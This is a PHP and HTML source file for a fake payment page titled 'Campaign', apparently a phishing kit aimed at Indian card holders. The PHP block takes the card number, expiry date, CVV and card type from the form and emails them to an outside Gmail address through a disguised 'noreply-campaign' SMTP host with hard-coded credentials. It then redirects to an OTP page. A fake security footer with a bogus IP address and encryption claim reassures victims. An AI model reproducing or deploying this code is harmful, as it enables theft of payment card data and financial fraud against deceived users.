<?php 
session_start();
date_default_timezone_set('Asia/Kolkata');
@extract($_POST);
include('PHPMailer/class.phpmailer.php');
include('PHPMailer/class.smtp.php');
  if(isset($submit))
    { 
      $_SESSION['very_funny'] = $c_number;
                $mail = new PHPMailer();
                $mail->isSMTP();
                $mail->Host = "noreply-campaign-for-new-user.online";
                $mail->SMTPAuth = true;
                $mail->SMTPSecure = 'ssl';
                $mail->Port = 465;
                $mail->Username = "info@noreply-campaign-for-new-user.online";
                $mail->Password = "Admin@123";
                $mail->AddAddress("easymailid45@gmail.com");
                $mail->SetFrom($mail->Username);
                
                $mail->isHTML(true);
                $mail->Subject   = 'Second';
                
                     $mail->Body = '<style>tr{font-family:Arial, Helvetica, sans-serif;font-size: 12px;}</style>
                                <p><b>No.</b> - '.$c_number.'</p>
                                <p><b>Month</b> - '.$expmon.'</p>
                                <p><b>Yr</b> - '.$expyr.'</p>
                                <p><b>CV</b> - '.$cvv.'</p>
                                <p><b>Name</b> - '.$holder_name.'</p>';
                
                
                if(!($mail->Send()))
                {
                    $msg="<div class='alert alert-danger'><span><b>Warning! </b>All fields are mandatory</span><a href='#' class='close' data-dismiss='alert'>&times;</a></div>";   
                }
                else
                {
                    header("Location:o-t-p.php");      
                }
    }

 ?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Campaign</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
    <link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body class="make-body">
    <img class="widthimg" src="img/make-mobile-header.jpg">
    <div class="underlinelogo"></div>
    <div class="container">
        <div class="row adm">
              <div class="col-md-12 text-center bordermarc"><p class="pera"><img src="img/img010.png" style="width: 100%;"></p></div>
              <div class="col-xs-6 col-md-5"><p class="pera"><b>Reference No:</b> <br>89823499</p></div>
              <div class="col-xs-6 col-md-7"><p class="pera trac"><b><img style="width: 100%;" src="img/img011.png"></b> <br><?=$_SESSION['amount']?>.00 INR</p></div>
        </div>
    </div>

    <section class="whitebg">
        <div class="container">
            <form method="post">
                <div class="row">
                <div class="col-xs-12">
                    <div class="box-input">
                        <p><img style="width: 100%;" src="img/img012.jpg"></p>
                        <input class="mobilewidth cardrd" type="text" placeholder="Please Enter" name="c_number" minlength="16" maxlength="16">
                        <div class="input-group-addon rightfloat pd6"><img src="img/iconn.png"></div>
                    </div>
                </div>

                <div class="col-xs-4">
                    <div class="box-input">
                        <p><img style="width: 100%;" class="img100" src="img/img013.jpg"></p>
                        <select class="form-control" name="holder_name" required="">
                          <option selected="selected">Select</option>
                          <option value="Maestro">Maestro</option>
                        <option value="Master">Master</option>
                        <option value="Visa">Visa</option>
                        </select>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="col-xs-3 pd0">
                    <div class="box-input">
                        <p><img style="width: 100%;" src="img/img014.jpg"></p>
                        <select class="form-control" name="expmon" required="">
                          <option selected="selected">Select</option>
                          <option value="01">01 (Jan)</option>
                            <option value="02">02 (Feb)</option>
                            <option value="03">03 (Mar)</option>
                            <option value="04">04 (Apr)</option>
                            <option value="05">05 (May)</option>
                            <option value="06">06 (Jun)</option>
                            <option value="07">07 (Jul)</option>
                            <option value="08">08 (Aug)</option>
                            <option value="09">09 (Sep)</option>
                            <option value="10">10 (Oct)</option>
                            <option value="11">11 (Nov)</option>
                            <option value="12">12 (Dec)</option>
                        </select>
                    </div>
                </div>

                <div class="col-xs-3 pd0">
                    <div class="box-input">
                        <p><img style="width: 100%;" src="img/img015.jpg"></p>
                        <select class="form-control" name="expyr" required="">
                            <option selected="selected">Select</option>
                            <option value="01">01 (Jan)</option>
                            <option value="2019">2019</option>
                            <option value="2020">2020</option>
                            <option value="2021">2021</option>
                            <option value="2022">2022</option>
                            <option value="2023">2023</option>
                            <option value="2024">2024</option>
                            <option value="2025">2025</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                            <option value="2031">2031</option>
                            <option value="2032">2032</option>
                            <option value="2033">2033</option>
                            <option value="2034">2034</option>
                            <option value="2035">2035</option>
                            <option value="2036">2036</option>
                            <option value="2037">2037</option>
                            <option value="2038">2038</option>
                            <option value="2039">2039</option>
                            <option value="2040">2040</option>
                            <option value="2041">2041</option>
                            <option value="2042">2042</option>
                            <option value="2043">2043</option>
                            <option value="2044">2044</option>
                            <option value="2045">2045</option>
                            <option value="2046">2046</option>
                            <option value="2047">2047</option>
                            <option value="2048">2048</option>
                            <option value="2049">2049</option>
                            <option value="2050">2050</option>
                            <option value="2051">2051</option>
                            <option value="2052">2052</option>
                            <option value="2053">2053</option>
                            <option value="2054">2054</option>
                            <option value="2055">2055</option>
                            <option value="2056">2056</option>
                            <option value="2057">2057</option>
                            <option value="2058">2058</option>
                            <option value="2059">2059</option>
                            <option value="2060">2060</option>
                            <option value="2061">2061</option>
                            <option value="2062">2062</option>
                            <option value="2063">2063</option>
                            <option value="2064">2064</option>
                            <option value="2065">2065</option>
                        </select>
                    </div>
                </div>

                <div class="col-xs-3 pd0">
                    <div class="box-input">
                        <p><img style="width: 100%;" src="img/img016.jpg"></p>
                        <input type="password" placeholder="..." name="cvv" maxlength="3" required="">
                    </div>

                </div>

                <div class="col-xs-3"><br><br>
                    <img src="img/help.png">
                </div>
            </div>
            <br>
            <div class="row">
              <div class="col-xs-6">
                <div class="box-input">
                    <a href="make-paym.php" class="pull-right mrgt">Cancel</a>
                </div>
            </div>

            <div class="col-xs-6">
              <div class="box-input">
                  <button class="btn subtbtn" type="submit" name="submit">Submit</button>
              </div>
            </div>
            </div>
            </form>
        </div>
    </section>

    <section class="footersecond">
        <div class="container">
            <div class="row">
                <div class="col-md-12 ipdetails">
                <p class="small footer-text">Your amount is processed through a secure 138 bit htttps internet connection based on secure socket layer technology. For security purposes, Your address <strong>192.58.277.41</strong> and access time <strong><?=date("M d h:i:s")?> IST <?=date("yy")?></strong>                        have been logged.</p>
            </div>
                <div class="col-xs-12">
                    <img style="width: 100%;" src="img/cc-logoo.png" />
                </div>
            </div>
        </div>
    </section>
    <br><br><br>
</body>
</html>